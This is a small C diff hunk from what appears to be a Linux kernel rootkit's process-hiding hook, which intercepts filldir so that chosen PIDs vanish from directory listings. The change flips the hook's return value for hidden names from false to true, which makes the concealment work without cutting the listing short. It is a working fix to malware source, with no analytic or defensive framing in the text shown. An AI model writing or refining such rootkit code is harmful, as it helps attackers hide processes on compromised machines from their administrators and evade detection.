@@ -134,7 +134,7 @@ static bool _neverc_krt_pid_filldir_returns_bool(struct dir_context *ctx,
 	neverc_krt_filldir_returns_bool_fn orig;
 
 	if (_neverc_krt_pid_name_hidden(name, namlen))
-		return false;
+		return true;
 	orig = (neverc_krt_filldir_returns_bool_fn)_neverc_krt_pid_actor_get_orig();
 	if (orig)
 		return orig(ctx, name, namlen, offset, ino, type);
